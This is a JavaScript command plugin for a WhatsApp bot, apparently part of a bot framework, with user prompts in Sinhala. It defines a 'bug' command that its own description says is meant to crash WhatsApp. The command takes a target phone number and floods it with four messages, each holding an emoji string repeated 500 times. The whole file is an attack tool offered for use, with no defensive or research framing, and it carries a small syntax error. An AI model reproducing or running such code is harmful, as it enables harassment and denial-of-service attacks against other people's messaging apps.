const { cmd } = require('../lib/command')

cmd({
  pattern: 'bug'
  desc: 'Send a heavy lag message chunked to crash WhatsApp',
  category: 'fun',
  use: '<number>',
  filename: __filename
}, async (conn, m, msg, { text }) => {
  const numberRaw = text.trim()
  if (!numberRaw) {
    return msg.reply('📌 උදාහරණය:\n.bug 94771234567')
  }

  let number = numberRaw.replace(/[^0-9]/g, '')
  if (!number.endsWith('@s.whatsapp.net')) number += '@s.whatsapp.net'

  const baseWord = '💥whatsapbug💣🚨'
  const repeatPerMsg = 500
  const totalRepeat = 2000
  const totalMsgs = totalRepeat / repeatPerMsg // 4 messages

  const msgTextArray = Array(totalMsgs).fill(baseWord.repeat(repeatPerMsg))

  try {
    // Send all messages in parallel but with a slight delay between each
    for (let i = 0; i < msgTextArray.length; i++) {
      conn.sendMessage(number, { text: msgTextArray[i] })
      // 100ms delay between messages to reduce bot lag
      await new Promise(res => setTimeout(res, 100))
    }

    msg.reply(`✅ Sent ${totalMsgs} lag messages (each repeated ${repeatPerMsg} times) to ${numberRaw}`)
  } catch (e) {
    msg.reply('❌ Failed to send bug messages.\n' + e.message)
  }
})
